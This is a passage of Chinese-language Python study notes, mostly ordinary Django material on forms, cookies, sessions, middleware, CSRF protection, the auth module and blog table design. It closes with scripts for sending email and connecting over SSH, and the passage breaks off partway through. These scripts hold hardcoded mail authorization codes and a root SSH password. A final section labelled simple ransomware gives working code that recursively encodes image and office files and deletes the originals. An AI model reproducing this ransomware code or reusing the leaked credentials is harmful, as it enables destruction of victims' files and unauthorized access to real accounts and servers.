            RegexValidator(r'^159[0-9]+$', '数字必须以159开头')
        ]
```

### 18-8 其他类型渲染

```python
# radio
    gender = forms.ChoiceField(
        choices=((1, "男"), (2, "女"), (3, "保密")),
        label="性别",
        initial=3,
        widget=forms.widgets.RadioSelect()
    )
    # select
    hobby = forms.ChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=3,
        widget=forms.widgets.Select()
    )
    # 多选
    hobby1 = forms.MultipleChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=[1, 3],
        widget=forms.widgets.SelectMultiple()
    )
    # 单选checkbox
    keep = forms.ChoiceField(
        label="是否记住密码",
        initial="checked",
        widget=forms.widgets.CheckboxInput()
    )
    # 多选checkbox
    hobby2 = forms.MultipleChoiceField(
        choices=((1, "篮球"), (2, "足球"), (3, "双色球"),),
        label="爱好",
        initial=[1, 3],
        widget=forms.widgets.CheckboxSelectMultiple()
    )
```

### 18-9 forms组件源码

```Python
"""
切入点:
	form_obj.is_valid()
"""
def is_valid(self):
        """
        Returns True if the form has no errors. Otherwise, False. If errors are
        being ignored, returns False.
        """
   return self.is_bound and not self.errors
   # 如果is_valid要返回True的话 那么self.is_bound要为True self.errors要为Flase
  
  
self.is_bound = data is not None or files is not None  # 只要你传值了肯定为True


@property
def errors(self):
        "Returns an ErrorDict for the data provided for the form"
        if self._errors is None:
            self.full_clean()
        return self._errors

# forms组件所有的功能基本都出自于该方法
def full_clean(self):
  	self._clean_fields()  # 校验字段 + 局部钩子
    self._clean_form()  # 全局钩子
    self._post_clean()  
```

## 12-19 cookie与session

### 19-1 cookie与session

```python
"""
发展史
	1.网站都没有保存用户功能的需求 所有用户访问返回的结果都是一样的
		eg:新闻、博客、文章...
	
	2.出现了一些需要保存用户信息的网站
		eg:淘宝、支付宝、京东...
		
		以登陆功能为例:如果不保存用户登陆状态 也就意味着用户每次访问网站都需要重复的输入用户名和密码(你觉得这样的网站你还想用吗？)
		当用户第一次登陆成功之后 将用户的用户名密码返回给用户浏览器 让用户浏览器保存在本地，之后访问网站的时候浏览器自动将保存在浏览器上的用户名和密码发送给服务端，服务端获取之后自动验证
		早起这种方式具有非常大的安全隐患
		
		
		优化:
			当用户登陆成功之后，服务端产生一个随机字符串(在服务端保存数据,用kv键值对的形式)，交由客户端浏览器保存
			随机字符串1:用户1相关信息
			随机字符串2:用户2相关信息
			随机字符串3:用户3相关信息
			之后访问服务端的时候，都带着该随机字符串，服务端去数据库中比对是否有对应的随机字符串从而获取到对应的用户信息
			
	
  
但是如果你拿到了截获到了该随机字符串，那么你就可以冒充当前用户 其实还是有安全隐患的


你要知道在web领域没有绝对的安全也没有绝对的不安全
"""
cookie
	服务端保存在客户端浏览器上的信息都可以称之为cookie
  它的表现形式一般都是k:v键值对(可以有多个)
session
	数据是保存在服务端的并且它的表现形式一般也是k:v键值对(可以有多个)
    
    
下述内容暂时了解即可 先给我搞明白最简单的cookie与session使用再说话！
token
	session虽然数据是保存在服务端的 但是禁不住数据量大
  服务端不再保存数据
  	登陆成功之后 将一段用户信息进行加密处理(加密算法之后你公司开发知道)
    将加密之后的结果拼接在信息后面 整体返回给浏览器保存 
    浏览器下次访问的时候带着该信息 服务端自动切去前面一段信息再次使用自己的加密算法
    跟浏览器尾部的密文进行比对
jwt认证
	三段信息
  (后期会讲 结合django一起使用) 
	
总结:
  	1.cookie就是保存在客户端浏览器上的信息
    2.session就是保存在服务端上的信息
    3.session是基于cookie工作的(其实大部分的保存用户状态的操作都需要使用到cookie)
```

### 19-2 Django操作cookie

```python
# 虽然cookie是服务端告诉客户端浏览器需要保存内容
# 但是客户端浏览器可以选择拒绝保存 如果禁止了 那么 只要是需要记录用户状态的网站登陆功能都无法使用了

# 视图函数的返回值
return HttpResponse()
return render()
return redirect()


obj1 = HttpResponse()
# 操作cookie
return obj1

obj2 = render()
# 操作cookie
return obj2

obj3 = redirect()
# 操作cookie
return obj3
# 如果你想要操作cookie，你就不得不利用obj对象



## 设置cookie
	obj.set_cookie(key,value)
## 获取cookie
	request.COOKIES.get(key)
## 在设置cookie的时候可以添加一个超时时间
	obj.set_cookie('username', 'jason666',max_age=3,expires=3)
	
	max_age  ## 5秒超时
	expires
		## 两者都是设置超时时间的 并且都是以秒为单位
		## 需要注意的是 针对IE浏览器需要使用expires
## 主动删除cookie(注销功能)

	
```

### 19-3 登录装饰器

```python
# 我们完成一个真正的登陆功能
# 校验用户是否登陆的装饰器
"""
用户如果在没有登陆的情况下想访问一个需要登陆的页面
那么先跳转到登陆页面 当用户输入正确的用户名和密码之后
应该跳转到用户之前想要访问的页面去 而不是直接写死
"""
def login_auth(func):
    def inner(request,*args,**kwargs):
        # print(request.path_info)
        # print(request.get_full_path())  # 能够获取到用户上一次想要访问的url
        target_url = request.get_full_path()
        if request.COOKIES.get('username'):
            return func(request,*args,**kwargs)
        else:
            ## 以next查询字符串的方式，把用户想要访问的页面传到login页面
            return redirect('/login/?next=%s'%target_url)
    return inner

def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if username == 'jason' and password == '123':

            # 获取用户上一次想要访问的url
            target_url = request.GET.get('next')  # 这个结果可能是None
            if target_url:
                obj = redirect(target_url)
            else:
                # 保存用户登陆状态
                obj = redirect('/home/')
            # 让浏览器记录cookie数据
            obj.set_cookie('username', 'jason666')
            """
            浏览器不单单会帮你存
            而且后面每次访问你的时候还会带着它过来
            """
            # 跳转到一个需要用户登陆之后才能看的页面
            return obj
    return render(request,'login.html')


@login_auth
def home(request):
    # 获取cookie信息 判断你有没有
    # if request.COOKIES.get('username') == 'jason666':
    #     return HttpResponse("我是home页面，只有登陆的用户才能进来哟~")
    # # 没有登陆应该跳转到登陆页面
    # return redirect('/login/')
    return HttpResponse("我是home页面，只有登陆的用户才能进来哟~")

@login_auth
def logout(requests):
    obj = redirect('/login/')
    obj.delete_cookie('username')
    return obj
```

### 19-4 django操作session

```python
## session数据是保存在服务端的(存？)，给客户端返回的是一个随机字符串
	sessionid:随机字符串
	
## 在默认情况下操作session的时候需要django默认的一张django_session表
	## 数据库迁移命令
		## django会自己创建很多表	django_session就是其中的一张
		

## django默认session的过期时间是14天
	## 但是你也可以人为的修改它
	

## 设置session	
	request.session['key'] = value

## 获取session
	request.session.get('key')

## 设置过期时间
	request.session.set_expiry()
    
	## 括号内可以放四种类型的参数
		1.整数						多少秒
		2.日期对象			            到指定日期就失效
		3.0							  一旦当前浏览器窗口关闭立刻失效
		4.不写						失效时间就取决于django内部全局session默认的失效时间

## 清除session	
	request.session.delete()  # 只删服务端的 客户端的不删
	request.session.flush()  # 浏览器和服务端都清空(推荐使用)


## session是保存在服务端的 但是session的保存位置可以有多种选择
	1.MySQL
	2.文件
	3.redis
	4.memcache
	...
	

django_session表中的数据条数是取决于浏览器的
	## 同一个计算机上(IP地址)同一个浏览器只会有一条数据生效
	## (当session过期的时候可能会出现多条数据对应一个浏览器，但是该现象不会持续很久，内部会自动识别过期的数据清除 你也可以通过代码清除)
	
	## 主要是为了节省服务端数据库资源

def set_session(request)；
	request.session['hobby'] = 'girl'
    """
    内部发送了那些事
        1.django内部会自动帮你生成一个随机字符串
        2.django内部自动将随机字符串和对应的数据存储到django_session表中
            2.1先在内存中产生操作数据的缓存
            2.2在响应结果django中间件的时候才真正的操作数据库
        3.将产生的随机字符串返回给客户端浏览器保存
    """
def get_session(request):
	request.session.get('hobby')
    """
    内部发送了那些事
        1.自动从浏览器请求中获取sessionid对应的随机字符串
        2.拿着该随机字符串去django_session表中查找对应的数据
        3.
            如果比对上了 则将对应的数据取出并以字典的形式封装到request.session中
            如果比对不上 则request.session.get()返回的是None
    """
  
  
# 利用session实现登陆验证
```

### 19-5 CBV如何添加装饰器

```python
from django.views import View
from django.utils.decorators import method_decorator
"""
CBV中django不建议你直接给类的方法加装饰器
无论该装饰器能都正常给你 都不建议直接加
"""

# @method_decorator(login_auth,name='get')  # 方式2(可以添加多个针对不同的方法加不同的装饰器)
# @method_decorator(login_auth,name='post')
class MyLogin(View):
    @method_decorator(login_auth)  # 方式3:它会直接作用于当前类里面的所有的方法
    def dispatch(self, request, *args, **kwargs):
        return super().dispatch(request,*args,**kwargs)
    # @method_decorator(login_auth)  # 方式1:指名道姓
    def get(self,request):
        return HttpResponse("get请求")

    def post(self,request):
        return HttpResponse('post请求')
```

## 12-20 Django中间件

### 20-1 django中间件

```python
"""
django中间件是django的门户
1.请求来的时候需要先经过中间件才能到达真正的django后端
2.响应走的时候最后也需要经过中间件才能发送出去

django自带七个中间件
"""
## django请求生命周期流程图

## 研究django中间件代码规律
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

class SessionMiddleware(MiddlewareMixin):
    def process_request(self, request):
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME)
        request.session = self.SessionStore(session_key)
    def process_response(self, request, response):
        return response
      
class CsrfViewMiddleware(MiddlewareMixin):
  	def process_request(self, request):
        csrf_token = self._get_token(request)
        if csrf_token is not None:
            # Use same token next time.
            request.META['CSRF_COOKIE'] = csrf_token
    def process_view(self, request, callback, callback_args, callback_kwargs):
        return self._accept(request)

    def process_response(self, request, response):
        return response
      
class AuthenticationMiddleware(MiddlewareMixin):
    def process_request(self, request):
        request.user = SimpleLazyObject(lambda: get_user(request))
"""
django支持程序员自定义中间件并且暴露给程序员五个可以自定义的方法
	1.必须掌握
		process_request
		
		process_response
	2.了解即可
		process_view
			
		process_template_response
		
		process_exception
"""
```

### 20-2 如何自定义中间件

```python
from django.utils.deprecation import MiddlewareMixin

class MyMiddleware(MiddlewareMixin):
	def process_request(self,request):
		print('我是第一个自定义中间件里的process_request方法')

	def process_response(self,request,response):


		## 必须返回response 要不然就等于拦截了
		return response
	def process_view(self,request,view_name,*args,**kwargs):
		## 在路由匹配成功之后，在视图函数执行之前触发这个方法
		print(view_name,args,kwargs)
		print('我是process_view方法')
		
	def process_template_response(self,request,response):
		## 执行条件很苛刻，了解一下即可，反正用的极少极少极少
		
		return response
	def process_exception(self,request,exception):
		## 当视图函数中出现异常的情况下触发
		print(exception)


"""
1.在项目名或者应用名下创建一个任意名称的文件夹
2.在该文件夹内创建一个任意名称的py文件
3.在该py文件内需要书写类(这个类必须继承MiddlewareMixin)
	然后在这个类里面就可以自定义五个方法了
	(这五个方法并不是全部都需要书写，用几个写几个)
4.需要将类的路径以字符串的形式注册到配置文件中才能生效
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    '你自己写的中间件的路径1',
    '你自己写的中间件的路径2',
    '你自己写的中间件的路径3',
]

"""
"""
1.必须掌握
		process_request 
			1.请求来的时候需要经过每一个中间件里面的process_request方法
			结果的顺序是按照配置文件中注册的中间件从上往下的顺序依次执行
			2.如果中间件里面没有定义该方法，那么直接跳过执行下一个中间件
			3.如果该方法返回了HttpResponse对象，那么请求将不再继续往后执行
			而是直接原路返回(校验失败不允许访问...)
			process_request方法就是用来做全局相关的所有限制功能
			
		process_response
			1.响应走的时候需要结果每一个中间件里面的process_response方法
			该方法有两个额外的参数request,response
			2.该方法必须返回一个HttpResponse对象
				1.默认返回的就是形参response
				2.你也可以自己返回自己的
			3.顺序是按照配置文件中注册了的中间件从下往上依次经过
				如果你没有定义的话 直接跳过执行下一个
		
		研究如果在第一个process_request方法就已经返回了HttpResponse对象，那么响应走的时候是经过所有的中间件里面的process_response还是有其他情况
		是其他情况
			就是会直接走同级别的process_reponse返回
		
		flask框架也有一个中间件但是它的规律
			只要返回数据了就必须经过所有中间件里面的类似于process_reponse方法
			
			
2.了解即可
		process_view
			路由匹配成功之后执行视图函数之前，会自动执行中间件里面的该放法
			顺序是按照配置文件中注册的中间件从上往下的顺序依次执行
			
		process_template_response
			返回的HttpResponse对象有render属性的时候才会触发
			顺序是按照配置文件中注册了的中间件从下往上依次经过
			
		process_exception
			当视图函数中出现异常的情况下触发
			顺序是按照配置文件中注册了的中间件从下往上依次经过
"""
```

### 20-3 csrf跨站请求伪造

```python
"""
钓鱼网站
	我搭建一个跟正规网站一模一样的界面(中国银行)
	用户不小心进入到了我们的网站，用户给某个人打钱
	打钱的操作确确实实是提交给了中国银行的系统，用户的钱也确确实实减少了
	但是唯一不同的时候打钱的账户不适用户想要打的账户变成了一个莫名其妙的账户

大学英语四六级
	考之前需要学生自己网站登陆缴费

内部本质
	我们在钓鱼网站的页面 针对对方账户 只给用户提供一个没有name属性的普通input框
	然后我们在内部隐藏一个已经写好name和value的input框

如何规避上述问题
	csrf跨站请求伪造校验
		网站在给用户返回一个具有提交数据功能页面的时候会给这个页面加一个唯一标识
		当这个页面朝后端发送post请求的时候 我的后端会先校验唯一标识，如果唯一标识不对直接拒绝(403 forbbiden)如果成功则正常执行	
"""
```

### 20-4 如何符合校验

```python
# form表单如何符合校验
<form action="" method="post">
    {% csrf_token %}
    <p>username:<input type="text" name="username"></p>
    <p>target_user:<input type="text" name="target_user"></p>
    <p>money:<input type="text" name="money"></p>
    <input type="submit">
</form>

# ajax如何符合校验
// 第一种 利用标签查找获取页面上的随机字符串
{#data:{"username":'jason','csrfmiddlewaretoken':$('[name=csrfmiddlewaretoken]').val()},#}
// 第二种 利用模版语法提供的快捷书写
{#data:{"username":'jason','csrfmiddlewaretoken':'{{ csrf_token }}'},#}
// 第三种 通用方式直接拷贝js代码并应用到自己的html页面上即可
data:{"username":'jason'}
```

```python
function getCookie(name) {
    var cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
            var cookie = jQuery.trim(cookies[i]);
            // Does this cookie string begin with the name we want?
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}
var csrftoken = getCookie('csrftoken');


function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}

$.ajaxSetup({
  beforeSend: function (xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader("X-CSRFToken", csrftoken);
    }
  }
});
```

### 20-5 CSRF相关装饰器

```python
"""
1.网站整体都不校验csrf，就单单几个视图函数需要校验
2.网站整体都校验csrf，就单单几个视图函数不校验
"""
from django.views.decorators.csrf import csrf_protect,csrf_exempt
from django.utils.decorators import method_decorator
"""
csrf_protect  需要校验
    针对csrf_protect符合我们之前所学的装饰器的三种玩法
csrf_exempt   忽视校验
    针对csrf_exempt只能给dispatch方法加才有效
"""


 'django.middleware.csrf.CsrfViewMiddleware' 
## 打开以后网站对csrf进行校验，这个时候可以用@csrf_exempt装饰器忽略某些函数的校验
    
  'django.middleware.csrf.CsrfViewMiddleware'
## 注释掉以后，整个网站就不会进行校验，这时候我们用@csrf_protect 对个别视图函数进行校验

# @csrf_exempt
# @csrf_protect
def transfer(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        target_user = request.POST.get('target_user')
        money = request.POST.get('money')
        print('%s给%s转了%s元'%(username,target_user,money))
    return render(request,'transfer.html')



from django.views import View

# @method_decorator(csrf_protect,name='post')  # 针对csrf_protect 第二种方式可以
# @method_decorator(csrf_exempt,name='post')  # 针对csrf_exempt 第二种方式不可以
@method_decorator(csrf_exempt,name='dispatch')
class MyCsrfToken(View):
    # @method_decorator(csrf_protect)  # 针对csrf_protect 第三种方式可以
    # @method_decorator(csrf_exempt)  # 针对csrf_exempt 第三种方式可以
    def dispatch(self, request, *args, **kwargs):
        return super(MyCsrfToken, self).dispatch(request,*args,**kwargs)

    def get(self,request):
        return HttpResponse('get')

    # @method_decorator(csrf_protect)  # 针对csrf_protect 第一种方式可以
    # @method_decorator(csrf_exempt)  # 针对csrf_exempt 第一种方式不可以
    def post(self,request):
        return HttpResponse('post')
```

### 20-6 补充知识点

```python
# 模块:importlib
import importlib
res = 'myfile.b'
ret = importlib.import_module(res)  # from myfile import b
# 该方法最小只能到py文件名
print(ret)
```

### 20-7 重要思想

```python
import settings
import importlib


def send_all(content):
    for path_str in settings.NOTIFY_LIST:  #'notify.email.Email'
        module_path,class_name = path_str.rsplit('.',maxsplit=1)
        # module_path = 'notify.email'  class_name = 'Email'
        # 1 利用字符串导入模块
        module = importlib.import_module(module_path)  # from notify import email
        # 2 利用反射获取类名
        cls = getattr(module,class_name)  # Email、QQ、Wechat
        # 3 生成类的对象
        obj = cls()
        # 4 利用鸭子类型直接调用send方法
        obj.send(content)
```

## 12-21 auth模块

### 21-1 Auth模块

```Python
"""
其实我们在创建好一个django项目之后直接执行数据库迁移命令会自动生成很多表
	django_session
	auth_user
django在启动之后就可以直接访问admin路由，需要输入用户名和密码，数据参考的就是auth_user表,并且还必须是管理员用户才能进入

创建超级用户(管理员)
	python3 manage.py createsuperuser
	
	或者在工具里面run manager.py
	然后在下面输入createsuperuser
	
依赖于auth_user表完成用户相关的所有功能
"""
```

### 21-2 方法总结

```python
from django.contrib import auth

# 1.比对用户名和密码是否正确
user_obj = auth.authenticate(request,username=username,password=password)
## 自动查找auth_user标签
## 自动给密码加密再比对
# 括号内必须同时传入用户名和密码
print(user_obj)  # 用户对象  jason   数据不符合则返回None
print(user_obj.username)  # jason
print(user_obj.password)  # 密文

# 2.保存用户状态
if user_obj:
	auth.login(request,user_obj)  # 类似于request.session[key] = user_obj
# 只要执行了该方法 你就可以在任何地方通过request.user获取到当前登陆的用户对象
## 如果没有登录则拿到的是AnonymousUser

# 3.判断当前用户是否登陆
request.user.is_authenticated()

# 4.获取当前登陆用户
request.user

# 5.校验用户是否登陆装饰器
from django.contrib.auth.decorators import login_required
# 局部配置
@login_required(login_url='/login/') 
# 全局配置,在settings.py里配置即可
LOGIN_URL = '/login/'
	1.如果局部和全局都有 该听谁的?
    ##  局部 > 全局
	2.局部和全局哪个好呢?
    ## 全局的好处在于无需重复写代码 但是跳转的页面却很单一
    ## 局部的好处在于不同的视图函数在用户没有登陆的情况下可以跳转到不同的页面

# 6.比对原密码
request.user.check_password(old_password)

if new_password == confirm_password:
    res = request.user.check_password(old_password) ## 自动加密比对密码
    ## 返回值为true 或者 false
    if res:
        ## 修改密码
        request.user.set_password(new_password)
        ## 一定要保存，要不然不会去操作数据库的
        request.user.save() 

# 7.修改密码
request.user.set_password(new_password)  # 仅仅是在修改对象的属性
request.user.save()  # 这一步才是真正的操作数据库

# 8.注销
auth.logout(request) 

# 9.注册
from django.contrib.auth.models import User
# 操作auth_user表写入数据
User.objects.create(username=username,password=password)  # 写入数据  但是密码是明文的，所以写入数据不能用create
# 创建普通用户
User.objects.create_user(username=username,password=password)
# 创建超级用户(了解):使用代码创建超级用户 邮箱是必填的 而用命令创建则可以不填
User.objects.create_superuser(username=username,email='123@qq.com',password=password)
```

### 21-3 如何扩展auth_user表

```python
from django.db import models
from django.contrib.auth.models import User,AbstractUser
# Create your models here.

# 第一种:一对一关系  不推荐
# class UserDetail(models.Model):
#     phone = models.BigIntegerField()
#     user = models.OneToOneField(to='User')


# 第二种:面向对象的继承
class UserInfo(AbstractUser):
    """
    如果继承了AbstractUser
    那么在执行数据库迁移命令的时候auth_user表就不会再创建出来了
    而UserInfo表中会出现auth_user所有的字段外加自己扩展的字段
    这么做的好处在于你能够直接点击你自己的表更加快速的完成操作及扩展
    
    前提:
        1.在继承之前没有执行过数据库迁移命令
            auth_user没有被创建，如果当前库已经创建了那么你就重新换一个库
        2.继承的类里面不要覆盖AbstractUser里面的字段名
            表里面有的字段都不要动，只扩展额外字段即可
        3.需要在配置文件中告诉django你要用UserInfo替代auth_user(******)
            AUTH_USER_MODEL = 'app01.UserInfo'
                                '应用名.表名'
    """
    phone = models.BigIntegerField()
    
    
"""
你如果自己写表替代了auth_user那么
auth模块的功能还是照常使用，参考的表页由原来的auth_user变成了UserInfo


我们bbs作业用户表就是用的上述方式
"""
```

## 12-22 bbs项目

### 22-1 表设计

```Python
"""
一个项目中最最最重要的不是业务逻辑的书写
而是前期的表设计，只要将表设计好了，后续的功能书写才会一帆风顺

bbs表设计
	1.用户表
		继承AbstractUser
		扩展
			phone 电话号码
			avatar  用户头像
			create_time  创建时间
		
		外键字段
			一对一个人站点表
	
	2.个人站点表
		site_name 站点名称
		site_title 	 站点标题
		site_theme	站点样式
	
	3.文章标签表
		name		标签名
		
		外键字段
			一对多个人站点
	
	4.文章分类表
		name		分类名
		
		外键字段
			一对多个人站点
	
	5.文章表
		title	文章标题
		desc	文章简介
		content	文章内容
		create_time 发布时间
		
		数据库字段设计优化(******)
			(虽然下述的三个字段可以从其他表里面跨表查询计算得出，但是频繁跨表效率)
		up_num					点赞数
		down_num				点踩数
		comment_num 		评论数
		
		外键字段
			一对多个人站点
			多对多文章标签
			一对多文章分类
			
		
	
	6.点赞点踩表
		记录哪个用户给哪篇文章点了赞还是点了踩
		user						ForeignKey(to="User")				
		article					ForeignKey(to="Article")	
		is_up						BooleanField()
		
		1				1				1
		1				2				1
		1				3				0
		2				1				1
		
	
	7.文章评论表
		记录哪个用户给哪篇文章写了哪些评论内容
		user						ForeignKey(to="User")				
		article					ForeignKey(to="Article")
		content					CharField()
		comment_time		DateField()
		# 自关联
		parent					ForeignKey(to="Comment",null=True)		
		# ORM专门提供的自关联写法	
		parent					ForeignKey(to="self",null=True)
		
	id	user_id			article_id				parent_id
	1		 1						1										
	2		 2						1										1					
		
根评论子评论的概念
	根评论就是直接评论当前发布的内容的
		
	子评论是评论别人的评论
		1.PHP是世界上最牛逼的语言
			1.1 python才是最牛逼的
				1.2 java才是
		
	根评论与子评论是一对多的关系
	
		
"""
```

### 22-2 表设计代码

```Python
from django.db import models

# Create your models here.

from django.contrib.auth.models import AbstractUser

class UserInfo(AbstractUser):
	phone = models.BigIntegerField(verbose_name='手机号',null=True)
	# 头像
	avatar = models.FileField(upload_to='avatar/',default='avatar/default.jpg',verbose_name='用户头像')
	'''
	给avatar字段传文件对象，该文件会自动存储到avatar文件下，然后avatar字段只保存文件路径avatar/default
	'''
	create_time = models.DateField(auto_now_add=True)

	blog = models.OneToOneField(to='Blog',null=True)


class Blog(models.Model):
	site_name = models.CharField(max_length=32,verbose_name='站点名称')
	site_title = models.CharField(verbose_name='站点标题',max_length=32)
	site_theme = models.CharField(verbose_name='站点样式',max_length=64) # 存储css或js的文件路径


class Category(models.Model):
	name = models.CharField(verbose_name='文章分类',max_length=32)

	blog = models.ForeignKey(to='Blog',null=True)


class Tag(models.Model):
	name = models.CharField(verbose_name='文章标签',max_length=32)
	blog = models.ForeignKey(to='Blog', null=True)

class Article(models.Model):
	title = models.CharField(max_length=64,verbose_name='文章标题')
	desc = models.CharField(max_length=255,verbose_name='文章简介')
	content = models.TextField(verbose_name='文章内容')
	create_time = models.DateField(auto_now_add=True)

	up_num = models.BigIntegerField(default=0,verbose_name='点赞数')
	down_num = models.BigIntegerField(default=0,verbose_name='点踩数')
	comment_num = models.BigIntegerField(default=0,verbose_name='评论数')

	## 外键字段
	blog = models.ForeignKey(to='Blog', null=True)
	category = models.ForeignKey(to='Category')
	tags = models.ManyToManyField(to='Tag',through='Article2Tag',through_fields=('article','tag'))

class Article2Tag(models.Model):
	article = models.ForeignKey(to='Article')
	tag = models.ForeignKey(to='Tag')

class UpAndDown(models.Model):
	user = models.ForeignKey(to='UserInfo')
	article = models.ForeignKey(to="Article")
	is_up = models.BooleanField()

class Comment(models.Model):
	user = models.ForeignKey(to='UserInfo')
	article = models.ForeignKey(to="Article")
	content = models.CharField(verbose_name='评论内容',max_length=255)
	comment_time = models.DateTimeField(verbose_name='评论时间',auto_now_add=True)

	## 自关联
	parent = models.ForeignKey(to='self',null=True)

```



## Django 报错解决

## 1-1   collections‘ has no attribute

module ‘collections‘ has no attribute ‘Iterable‘报错 

在python3.9之后collections.[Iterable](https://so.csdn.net/so/search?q=Iterable&spm=1001.2101.3001.7020)被废弃，在更高版本的环境中使用时会出现module 'collections' has no attribute 'Iterable’报错。

可以直接添加语句collections.Iterable = collections.abc.Iterable完成修改

```python
import collections
collections.Iterable = collections.abc.Iterable
```

## 1-2 TypeError: unsupported operand type(s) for /: 'str' and 'str'

'DIRS': [BASE_DIR / 'templates']

TypeError: unsupported operand type(s) for /: 'str' and 'str'

```python
setting 设置改为如下
'DIRS': [os.path.join(BASE_DIR,'templates')],
```



# 十七，Python其他

## 13-1  Python 发邮件

### 13-1-1 发163邮箱

```Python
## 直接导入内置模块
import smtplib ## smtplib 主要用于处理SMIP协议
# email 模块主要处理邮件的头和正文数据
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import time

##定义发件人和收件人
sender = 'aini_ai2022@163.com'
receiver = '2847077276@qq.com'

## 构件邮件的主体对象
msg = MIMEMultipart()
msg['Subject'] = 'aini python 邮件测试'
msg['From'] = sender
msg['To'] = receiver
# msg['To'] = '3484425158@qq.com'


body = '''
<h1>这是邮件的正文</h1>
<div style="font-size:30px;color:red;">what are you doing?</div>
<a href="101.132.222.28">这是我的服务器地址，里面有好多游戏，可以进去玩游戏</a>

'''

## 邮件的内容
content = MIMEText(body,'html','utf-8')
## 邮件的主体加到邮件主体对象
msg.attach(content)

## 添加邮件附件
## 文件地址
attachment = MIMEApplication(open('D:/Desktop/艾尼/a.png','rb').read())
## 文件名
filename = 'a.png'
attachment.add_header('Content-Disposition','attachment',filename=filename)
msg.attach(attachment)

## 建立邮件服务器的连接，发送邮件

##实例化SMTP对象
smtpObj = smtplib.SMTP()
smtpObj.connect('smtp.163.com','25')
smtpObj.login(user="aini_ai2022@163.com",password="EEDRNZJTKOBHVECW")
smtpObj.sendmail(sender,receiver,str(msg))
smtpObj.quit()

```

### 13-1-2 发QQ邮箱

```Python
## 直接导入内置模块
import smtplib ## smtplib 主要用于处理SMIP协议
# email 模块主要处理邮件的头和正文数据
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

## ugoyipmhabkwdeih

##定义发件人和收件人
sender = '2847077276@qq.com'
receiver = 'aini_ai2022@163.com'

## 构件邮件的主体对象
msg = MIMEMultipart()
msg['Subject'] = 'aini python 邮件测试'
msg['From'] = sender
msg['To'] = receiver
# msg['To'] = '3484425158@qq.com'


body = '''
<h1>这是邮件的正文</h1>
<div style="font-size:30px;color:red;">what are you doing?</div>
<a href="101.132.222.28">这是我的服务器地址，里面有好多游戏，可以进去玩游戏</a>

'''

## 邮件的内容
content = MIMEText(body,'html','utf-8')
## 邮件的主体加到邮件主体对象
msg.attach(content)

## 添加邮件附件
## 文件地址
attachment = MIMEApplication(open('D:/Desktop/艾尼/a.png','rb').read())
## 文件名
filename = 'a.png'
attachment.add_header('Content-Disposition','attachment',filename=filename)
msg.attach(attachment)

## 建立邮件服务器的连接，发送邮件


## 登录SMTP + SSL 邮件服务器
smtpObj = smtplib.SMTP_SSL('smtp.qq.com',465)
smtpObj.login(user="2847077276@qq.com",password="ugoyipmhabkwdeih")
smtpObj.sendmail(sender,receiver,str(msg))
smtpObj.quit()

```

## 13-2 Python连接SSH

```Python
import  paramiko

host = '101.132.222.28'
port = 22
userName = 'root'
password = 'abdigini123580A'

# ftp 连接方式		可以用于 传输文件使用
transport = paramiko.Transport(sock=(host, port))
transport.connect(username=userName, password=password)
ftp = paramiko.SFTPClient.from_transport(transport)			# 实例
session = transport.open_session()

# ssh 连接方式
ssh = paramiko.SSHClient()
ssh._transport = transport
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=host, username=userName, password=password, port=port)

session.get_pty()
session.invoke_shell()

## 执行命令，获取结果
stdin, stdout, stderr = ssh.exec_command('ifconfig')
res = stdout.read().decode()
print(res)

## 文件上传下载
ftp.put('./aini.jpg','/opt/aini.jpg')

## 下载文件
ftp.get('/opt/aini.jpg','../ai.jpg')
```

## 13-3 勒索病毒的简单编写

```python
# 如何使用Python对文件进行编码
# 可以使用base64进行加密，再保存，此时就无法打开此文件，解密的话按字符串进行解密，并重新保存为二进制文件

# 针对某个文件进行base64编码，并保存
import base64
import os

def encrypt(filepath):
	with open(filepath,mode='rb') as f:
		data = f.read()
	source = base64.b64encode(data).decode()
	## 利用加密算法，基于ascii往后移动5位
	dest = ''
	for c in source:
		dest += chr(ord(c) + 5)
	# 将加密字符串保存到文件中
	with open(filepath + '.enc',mode='w') as f1:
		f1.write(dest)
	os.remove(filepath)

# 解密算法
def decrypt(filepath):
	with open(filepath,mode='r') as f:
		data = f.read()
	dest = ''
	for c in data:
		dest += chr(ord(c) - 5)
	# base64解码
	source = base64.b64decode(dest)

	with open(filepath.rstrip('.enc') ,mode='wb') as f1:
		f1.write(source)
	os.remove(filepath)

list = ['png','jpg','pdf','xlsx','docx']
## 处理路径，通过递归遍历目录
def dir_handle(dirname):
	dirs = os.listdir(dirname)
	for item in dirs:
		if os.path.isdir(dirname + '/' + item) == True :
			dir_handle(dirname + '/' + item)
		if item.split('.')[-1] in list:
			encrypt(dirname + '/' +item)
		if item.split('.')[-1] == 'enc':
			decrypt(dirname + '/' +item)


if __name__ == '__main__':
